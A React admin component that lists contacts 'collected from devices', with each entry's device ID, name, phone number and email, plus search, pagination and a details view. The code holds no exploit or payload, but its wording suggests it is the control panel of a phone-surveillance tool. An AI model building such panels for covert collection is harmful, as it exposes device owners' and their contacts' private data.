import React, { useState, useEffect } from 'react';
import { toast } from 'react-toastify';
import './AdminViews.css';

const ContactsView = () => {
  const [contacts, setContacts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [selectedContact, setSelectedContact] = useState(null);

  useEffect(() => {
    fetchContacts();
  }, [currentPage]);

  const fetchContacts = async () => {
    try {
      setLoading(true);
      const response = await fetch(`/api/contacts?page=${currentPage}`);
      if (response.ok) {
        const data = await response.json();
        setContacts(data.contacts || []);
        setTotalPages(data.totalPages || 1);
      } else {
        toast.error('Failed to fetch contacts');
      }
    } catch (error) {
      console.error('Error fetching contacts:', error);
      toast.error('Error loading contacts');
    } finally {
      setLoading(false);
    }
  };

  const filteredContacts = contacts.filter(contact =>
    contact.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    contact.number.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (contact.email && contact.email.toLowerCase().includes(searchTerm.toLowerCase())) ||
    contact.deviceId.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const viewContactDetails = (contact) => {
    setSelectedContact(contact);
  };

  const closeModal = () => {
    setSelectedContact(null);
  };

  if (loading) {
    return <div className="loading">Loading contacts...</div>;
  }

  return (
    <div className="admin-view">
      <div className="view-header">
        <h1>👤 Contacts Management</h1>
        <p>Monitor all collected contacts from devices</p>
      </div>

      <div className="controls">
        <div className="search-filter">
          <input
            type="text"
            placeholder="Search contacts..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
        </div>
        <button onClick={fetchContacts} className="refresh-btn">
          🔄 Refresh
        </button>
      </div>

      <div className="stats-summary">
        <div className="stat-item">
          <span className="stat-label">Total Contacts:</span>
          <span className="stat-value">{contacts.length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">With Email:</span>
          <span className="stat-value">{contacts.filter(c => c.email).length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Unique Devices:</span>
          <span className="stat-value">{new Set(contacts.map(c => c.deviceId)).size}</span>
        </div>
      </div>

      <div className="data-table">
        <table>
          <thead>
            <tr>
              <th>Device ID</th>
              <th>Name</th>
              <th>Number</th>
              <th>Email</th>
              <th>Created</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filteredContacts.map((contact) => (
              <tr key={contact._id}>
                <td>
                  <div className="device-id">
                    <span className="id-text">{contact.deviceId}</span>
                  </div>
                </td>
                <td>
                  <div className="contact-name">
                    {contact.name}
                  </div>
                </td>
                <td>
                  <div className="contact-number">
                    {contact.number}
                  </div>
                </td>
                <td>
                  <div className="contact-email">
                    {contact.email || 'N/A'}
                  </div>
                </td>
                <td>{formatDate(contact.createdAt)}</td>
                <td>
                  <button
                    onClick={() => viewContactDetails(contact)}
                    className="view-btn"
                  >
                    👁️ View
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {totalPages > 1 && (
        <div className="pagination">
          <button
            onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
            disabled={currentPage === 1}
            className="page-btn"
          >
            Previous
          </button>
          <span className="page-info">
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
            disabled={currentPage === totalPages}
            className="page-btn"
          >
            Next
          </button>
        </div>
      )}

      {/* Contact Details Modal */}
      {selectedContact && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h2>Contact Details</h2>
              <button onClick={closeModal} className="close-btn">×</button>
            </div>
            <div className="modal-body">
              <div className="detail-section">
                <h3>Basic Information</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Device ID:</label>
                    <span>{selectedContact.deviceId}</span>
                  </div>
                  <div className="detail-item">
                    <label>Name:</label>
                    <span>{selectedContact.name}</span>
                  </div>
                  <div className="detail-item">
                    <label>Phone Number:</label>
                    <span>{selectedContact.number}</span>
                  </div>
                  <div className="detail-item">
                    <label>Email:</label>
                    <span>{selectedContact.email || 'N/A'}</span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Timestamps</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Created:</label>
                    <span>{formatDate(selectedContact.createdAt)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Updated:</label>
                    <span>{formatDate(selectedContact.updatedAt)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ContactsView; 